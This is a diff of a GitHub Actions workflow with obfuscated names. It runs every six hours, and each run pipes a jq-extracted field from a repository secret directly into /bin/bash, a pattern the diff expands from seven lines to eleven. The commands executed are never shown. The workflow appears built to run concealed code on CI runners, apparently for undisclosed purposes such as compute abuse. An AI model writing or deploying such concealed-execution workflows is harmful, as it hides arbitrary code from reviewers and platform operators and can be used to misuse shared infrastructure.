@@ -1,23 +1,29 @@
 name: huaizhongjiechu
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 0/6 * * *'
+    - cron: '11 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: huaizhongjiechu
         env:
-          ia62: ${{ secrets.ia62 }}
+          utumy5: ${{ secrets.utumy5 }}
         run: |
-          echo $ia62 | jq -r .mwo6775 | /bin/bash
-          echo $tuqg602 | jq -r .gtuub01 | /bin/bash
-          echo $qcu47645 | jq -r .oooc1429 | /bin/bash
-          echo $iudu6792 | jq -r .rs487 | /bin/bash
-          echo $pcgj96 | jq -r .sfwl650 | /bin/bash
-          echo $ddf08185 | jq -r .o74 | /bin/bash
-          echo $s8913 | jq -r .ew5597 | /bin/bash
+          echo $utumy5 | jq -r .l084 | /bin/bash
+          echo $czu9 | jq -r .rd729 | /bin/bash
+          echo $t56484 | jq -r .xg52606 | /bin/bash
+          echo $v57752 | jq -r .xdmd808 | /bin/bash
+          echo $nfoh4 | jq -r .syver87 | /bin/bash
+          echo $h974 | jq -r .nsk44 | /bin/bash
+          echo $v8569 | jq -r .dcycn95 | /bin/bash
+          echo $fytb97 | jq -r .fefyb2 | /bin/bash
+          echo $sjupk35 | jq -r .kugkk55 | /bin/bash
+          echo $lpw018 | jq -r .i66483 | /bin/bash
+          echo $oojib74785 | jq -r .qnsr4570 | /bin/bash
 
